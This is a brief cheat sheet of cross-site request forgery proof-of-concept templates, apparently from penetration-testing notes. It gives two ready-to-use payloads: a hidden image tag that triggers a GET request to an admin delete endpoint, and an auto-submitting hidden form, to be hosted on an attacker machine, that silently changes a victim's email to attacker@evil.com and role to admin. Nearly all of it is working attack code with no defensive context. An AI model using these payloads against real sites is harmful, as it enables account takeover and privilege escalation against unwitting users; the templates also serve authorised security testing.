🔗 CSRF PoC Templates

1. GET Based CSRF (Image Tag)

Use when the action is triggered via a simple URL link.

<img src="http://TARGET-IP/admin/delete?id=1" style="display:none;" />

2. POST Based CSRF (Auto-Submit Form)

Save this as an .html file and host it on your attacker machine.

<body onload="document.forms[0].submit()">
  <form action="http://TARGET-IP/profile/update" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
    <input type="hidden" name="role" value="admin" />
  </form>
</body>
